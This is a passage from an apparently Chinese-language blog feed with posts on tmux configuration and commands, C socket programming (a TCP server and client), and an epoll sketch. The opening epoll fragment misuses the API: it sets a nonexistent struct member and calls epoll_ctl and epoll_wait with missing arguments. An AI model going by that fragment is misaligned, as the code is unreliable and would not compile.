class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_bind_listen</span><span class="params">(<span class="type">char</span> *address,<span class="type">char</span> *port,<span class="type">unsigned</span> <span class="type">int</span> backlog)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = create_bind_listen(argv[<span class="number">1</span>],argv[<span class="number">2</span>],<span class="number">10</span>);</span><br><span class="line">    <span class="type">int</span> epfd = epoll_create(<span class="number">100</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">epoll_fd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event_epoll</span>[10];</span></span><br><span class="line">    epoll_fd.fd = fd;</span><br><span class="line">    epoll_fd.events = EPOLLIN;</span><br><span class="line">    epoll_fd.data.fd = fd;</span><br><span class="line">    epoll_ctl(epfd,EPOLL_CTL_ADD,&amp;epoll_fd);</span><br><span class="line">    <span class="type">int</span> event_count = epoll_wait(epfd,event_epoll,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;event_count;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//handler(event_poll[i].fd);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux基本使用</title>
      <link href="/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/04/17/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="tmux配置教程"><a href="#tmux配置教程" class="headerlink" title="tmux配置教程"></a>tmux配置教程</h1><h3 id="1-tmux是什么"><a href="#1-tmux是什么" class="headerlink" title="1.tmux是什么?"></a>1.tmux是什么?</h3><p>tmux是一个终端复用工具，在实际开发运维中，可以用来保存当前工作状态，也可以将当前的单个终端拆分多个窗口。</p><h3 id="2-tmux的基本结构"><a href="#2-tmux的基本结构" class="headerlink" title="2.tmux的基本结构"></a>2.tmux的基本结构</h3><p>tmux为C&#x2F;S架构，tmux进程为守护进程，独立于终端之外，在不使用tmux的情况下，在当前终端执行的所有任务都为当前终端的子进程，而在使用了tmux之后，在tmux下执行的任务为tmux的子进程,而tmux为一个守护进程，因此不用担心在退出当前终端或者远程ssh突然断网时，执行的任务被杀死的情况。</p><h3 id="3-tmux的三个概念"><a href="#3-tmux的三个概念" class="headerlink" title="3.tmux的三个概念"></a>3.tmux的三个概念</h3><h5 id="1-session"><a href="#1-session" class="headerlink" title="1.session"></a>1.session</h5><p>  一个session就是一个会话，session为tmux的一个会话，一个tmux可以同时开多个session。</p><h5 id="2-windows"><a href="#2-windows" class="headerlink" title="2.windows"></a>2.windows</h5><p>  window为session的子集，一个session可以有有多个window。</p><h5 id="3-pannel"><a href="#3-pannel" class="headerlink" title="3.pannel"></a>3.pannel</h5><p>  一个pannel为一个窗格,为window的子集,一个window可以有多个pannel</p><h3 id="4-tmux的安装使用"><a href="#4-tmux的安装使用" class="headerlink" title="4.tmux的安装使用"></a>4.tmux的安装使用</h3><h5 id="1-tmux的安装"><a href="#1-tmux的安装" class="headerlink" title="1.tmux的安装"></a>1.tmux的安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S tmux(安装环境为archlinux)</span><br></pre></td></tr></table></figure><h5 id="2-tmux配置文件"><a href="#2-tmux配置文件" class="headerlink" title="2.tmux配置文件"></a>2.tmux配置文件</h5><p>tmux系统配置文件为&#x2F;etc&#x2F;tmux.conf,用户配置文件为~&#x2F;.tmux.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解绑prefix键位</span></span><br><span class="line"><span class="built_in">set</span> -g default-terminal <span class="string">&quot;screen-256color&quot;</span></span><br><span class="line">unbind C-b</span><br><span class="line">unbind <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">unbind <span class="string">&#x27;%&#x27;</span></span><br><span class="line"><span class="comment">#设置prefix键位为C-a</span></span><br><span class="line"><span class="built_in">set</span> -g prefix C-a</span><br><span class="line"><span class="built_in">bind</span> C-a send-prefix</span><br><span class="line"><span class="comment">#设置切分窗格键位为prefix和h以及prefix和v</span></span><br><span class="line"><span class="built_in">bind</span> h split-window -h</span><br><span class="line"><span class="built_in">bind</span> v split-window -v</span><br><span class="line"><span class="comment">#设置C-r为重载tmux配置文件(指定-n为不用使用prefix键位就可以触发)</span></span><br><span class="line">bind-key -n C-r source-file ~/.tmux.conf</span><br><span class="line"><span class="comment">#设置调整窗格大小键位(指定-r键位为不用每次触发的时候都要使用prefix键位(只要摁一次prefix键位就可以持续出发操作))</span></span><br><span class="line"><span class="built_in">bind</span> -r H resize-pane -L 5</span><br><span class="line"><span class="built_in">bind</span> -r J resize-pane -D 5</span><br><span class="line"><span class="built_in">bind</span> -r K resize-pane -U 5</span><br><span class="line"><span class="built_in">bind</span> -r L resize-pane -R 5</span><br><span class="line"><span class="comment">#bind k selectp -U</span></span><br><span class="line"><span class="comment">#bind h selectp -L</span></span><br><span class="line"><span class="comment">#bind j selectp -D</span></span><br><span class="line"><span class="comment">#bind l selectp -R</span></span><br><span class="line"><span class="comment">#bind -r ^k resizep -U 5</span></span><br><span class="line"><span class="comment">#bind -r ^h resizep -L 5</span></span><br><span class="line"><span class="comment">#bind -r ^j resizep -D 5</span></span><br><span class="line"><span class="comment">#bind -r ^l resizep -R 5</span></span><br></pre></td></tr></table></figure><h5 id="3-tmux常用命令"><a href="#3-tmux常用命令" class="headerlink" title="3.tmux常用命令"></a>3.tmux常用命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个tmux会话并在该tmux会话下创建一个窗口并在该窗口下创建一个pannel</span></span><br><span class="line">tmux</span><br><span class="line"><span class="comment">#查看tmux会话</span></span><br><span class="line">tmux list-session</span><br><span class="line"><span class="comment">#离开tmux会话</span></span><br><span class="line">tmux detach</span><br><span class="line"><span class="comment">#进入已经打开的tmux会话</span></span><br><span class="line">tmux attach</span><br><span class="line"><span class="comment">#Ctrl+b %：划分左右两个窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b &quot;：划分上下两个窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b &lt;arrow key&gt;：光标切换到其他窗格。&lt;arrow key&gt;是指向要切换到的窗格的方向键，比如切换到下方窗格，就按方向键↓。</span></span><br><span class="line"><span class="comment">#Ctrl+b ;：光标切换到上一个窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b o：光标切换到下一个窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b &#123;：当前窗格与上一个窗格交换位置。</span></span><br><span class="line"><span class="comment">#Ctrl+b &#125;：当前窗格与下一个窗格交换位置。</span></span><br><span class="line"><span class="comment">#Ctrl+b Ctrl+o：所有窗格向前移动一个位置，第一个窗格变成最后一个窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b Alt+o：所有窗格向后移动一个位置，最后一个窗格变成第一个窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b x：关闭当前窗格。</span></span><br><span class="line"><span class="comment">#Ctrl+b !：将当前窗格拆分为一个独立窗口。</span></span><br><span class="line"><span class="comment">#Ctrl+b z：当前窗格全屏显示，再使用一次会变回原来大小。</span></span><br><span class="line"><span class="comment">#Ctrl+b Ctrl+&lt;arrow key&gt;：按箭头方向调整窗格大小。</span></span><br><span class="line"><span class="comment">#Ctrl+b q：显示窗格编号。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#切换窗格</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到上方窗格</span></span><br><span class="line">tmux select-pane -U</span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到下方窗格</span></span><br><span class="line">tmux select-pane -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到左边窗格</span></span><br><span class="line">tmux select-pane -L</span><br><span class="line"></span><br><span class="line"><span class="comment"># 光标切换到右边窗格</span></span><br><span class="line">tmux select-pane -R</span><br><span class="line"></span><br><span class="line"><span class="comment">#交换窗格</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前窗格上移</span></span><br><span class="line">tmux swap-pane -U</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前窗格下移</span></span><br><span class="line">tmux swap-pane -D</span><br><span class="line"><span class="comment">#窗口管理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建一个新的窗口</span></span><br><span class="line">tmux new-window <span class="string">&quot;window-name&quot;</span></span><br><span class="line"><span class="comment">#切换窗口</span></span><br><span class="line">tmux select-window -t &lt;window-number&gt; or &lt;window-name&gt;</span><br><span class="line"><span class="comment">#重命名window(修改当前窗口的名称)</span></span><br><span class="line">tmux rename-window <span class="string">&quot;new-name&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置与使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socket编程</title>
      <link href="/2022/04/17/socket%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/04/17/socket%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="socket编程"><a href="#socket编程" class="headerlink" title="socket编程"></a>socket编程</h1><h4 id="1-什么是socket"><a href="#1-什么是socket" class="headerlink" title="1.什么是socket?"></a>1.什么是socket?</h4><p>socket是应用层与TCP&#x2F;IP协议簇通信的中间抽象层，就是对网络中不同主机的应用进程之间进行双向通信的端点的抽象，提供了应用层进程利用网络协议交换数据的机制。套接字上联应用层，下联协议栈，是应用程序利用网络协议进行通信的接口。</p><h4 id="2-socket分类"><a href="#2-socket分类" class="headerlink" title="2.socket分类"></a>2.socket分类</h4><ul><li><p>SOCK_STREAM</p><p>基于TCP协议，面向连接，提供可靠传输、拥塞控制、数据校验、数据重传。</p></li><li><p>SOCK_DGRAM</p><p>尽最大努力交付，可以一对多通信，多对多通信。</p></li><li><p>SOCK_RAM</p><p>基于ip协议，可以基于ip协议自行组装数据包，利用原始套接字可以处理如ICMP、IGMP等网络层的数据包。</p></li></ul><h4 id="3-常用的api"><a href="#3-常用的api" class="headerlink" title="3.常用的api"></a>3.常用的api</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span> domain,<span class="type">int</span> type,<span class="type">int</span> protocol)</span>                    <span class="comment">//用于创建一个socket</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bind</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr,<span class="type">socklen_t</span> len)</span>      <span class="comment">//用于绑定一个端口</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">listen</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> backlog)</span>;                                 <span class="comment">//用于监听即将到来的连接</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="keyword">struct</span> sockaddr *addr,<span class="type">socklen_t</span> len)</span>   <span class="comment">//用于连接一个远程服务器</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">send</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> len,<span class="type">int</span> flags)</span>       <span class="comment">//类似于write函数</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">recv</span><span class="params">(<span class="type">int</span> sockfd,<span class="type">void</span> *buf,<span class="type">size_t</span> len,<span class="type">int</span> flags)</span>         <span class="comment">//类似于read函数</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">sendto</span><span class="params">(<span class="type">int</span> sockfd,<span class="type">const</span> <span class="type">void</span> *buf,<span class="type">size_t</span> len,<span class="type">int</span> flags,<span class="type">const</span> <span class="keyword">struct</span> sockaddr *dest_addr,<span class="type">socklen_t</span> addrlen)</span>;                         <span class="comment">//用于udp socket编程发送数据</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">recvfrom</span><span class="params">(<span class="type">int</span> sockfd,<span class="type">void</span> *buf,<span class="type">size_t</span> len,<span class="type">int</span> flags,<span class="type">const</span> <span class="keyword">struct</span> sockaddr *src_addr,<span class="type">socklen_t</span> *addrlen)</span>;                                    <span class="comment">//用于udp socket编程接收数据</span></span><br></pre></td></tr></table></figure><h4 id="4-基本的编程步骤"><a href="#4-基本的编程步骤" class="headerlink" title="4.基本的编程步骤"></a>4.基本的编程步骤</h4><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">a(socket 创建socket文件)--&gt;b(bind 绑定端口和ip地址)--&gt;c(listen 开始监听ip和端口)--&gt;d(accept 接收来自客户端的连接)--&gt;e(read/write开始和客户端收发数据)</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">a(socket 创建socket文件)--&gt;b(connect 连接服务器)--&gt;c(read/write,开始和服务端收发数据)</span><br></pre></td></tr></table></figure><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><h5 id="1-服务器"><a href="#1-服务器" class="headerlink" title="1.服务器"></a>1.服务器</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;strings.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Usage</span><span class="params">(<span class="type">char</span>* argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage:\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">New_Socket</span><span class="params">(<span class="type">char</span>* addr, <span class="type">char</span>* port, <span class="type">int</span> backlog)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//创建socket</span></span><br><span class="line"><span class="type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ADDR</span>;</span></span><br><span class="line">ADDR.sin_family = AF_INET;</span><br><span class="line">ADDR.sin_port = htons(atoi(port));</span><br><span class="line"><span class="keyword">if</span> (inet_pton(AF_INET, addr, &amp;ADDR.sin_addr) != <span class="number">1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;inet_pton&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绑定地址以及端口</span></span><br><span class="line"><span class="keyword">if</span> (bind(fd, (<span class="keyword">struct</span> sockaddr*)&amp;ADDR, SOCKLEN) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//进入监听状态,等待接收来之客户端的连接</span></span><br><span class="line"><span class="keyword">if</span> (listen(fd, backlog) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回socket</span></span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">socklen_t</span> len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">Usage(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> fd = New_Socket(argv[<span class="number">1</span>], argv[<span class="number">2</span>], <span class="number">5</span>);</span><br><span class="line"><span class="comment">//定义客户端信息变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line"><span class="comment">//接收来自客户端发来的请求</span></span><br><span class="line"><span class="type">int</span> clientfd = accept(fd, (<span class="keyword">struct</span> sockaddr*)&amp;client_addr, &amp;len);</span><br><span class="line"><span class="keyword">if</span> (clientfd == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">bzero(buffer, <span class="number">100</span>);</span><br><span class="line"><span class="comment">//接收来自客户端发来的数据</span></span><br><span class="line"><span class="keyword">if</span> (read(clientfd, buffer, <span class="number">100</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recv from client:%s&quot;</span>, buffer);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">perror(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-客户端"><a href="#2-客户端" class="headerlink" title="2.客户端"></a>2.客户端</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//客户端</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKLEN (sizeof(struct sockaddr))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Usage</span><span class="params">(<span class="type">char</span>* argv)</span> <span class="comment">//使用帮助函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage:\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s SERVERADDR SERVERPORT&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">New_Socket</span><span class="params">(<span class="type">char</span>* addr, <span class="type">char</span>* port)</span> <span class="comment">//创建socket用于连接远程服务器</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serveraddr</span>;</span></span><br><span class="line">serveraddr.sin_family = AF_INET;</span><br><span class="line">serveraddr.sin_port = htons(atoi(port));</span><br><span class="line"><span class="comment">//转换ip地址类型</span></span><br><span class="line"><span class="keyword">if</span> (inet_pton(AF_INET, addr, &amp;serveraddr.sin_addr) != <span class="number">1</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;inet_pton&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line"><span class="keyword">if</span> (connect(fd, (<span class="keyword">struct</span> sockaddr*)&amp;serveraddr, SOCKLEN) != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">Usage(argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建socket</span></span><br><span class="line"><span class="type">int</span> fd = New_Socket(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;connect server error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义发送数据</span></span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Hello,World&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> len = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//将数据写入socket发送缓冲区</span></span><br><span class="line"><span class="keyword">if</span> (write(fd, str, len) != len) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send string to server error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;send string to server successful!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux设备驱动开发入门</title>
      <link href="/2022/04/17/linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
      <url>/2022/04/17/linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
      
